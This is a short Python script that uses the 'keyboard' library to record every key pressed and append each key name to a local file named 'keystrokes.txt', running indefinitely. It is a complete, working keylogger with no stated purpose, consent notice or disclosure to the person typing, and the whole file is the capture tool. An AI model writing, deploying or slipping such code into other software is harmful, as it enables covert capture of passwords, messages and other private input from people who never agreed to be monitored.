import keyboard as Keyboard

log_file = "keystrokes.txt"

def on_key_press(event):
    with open(log_file, 'a') as f:
        f.write('{}\n'.format(event.name))

Keyboard.on_press(on_key_press)

# Keep the program running to continue to
# logging keystrokes
Keyboard.wait()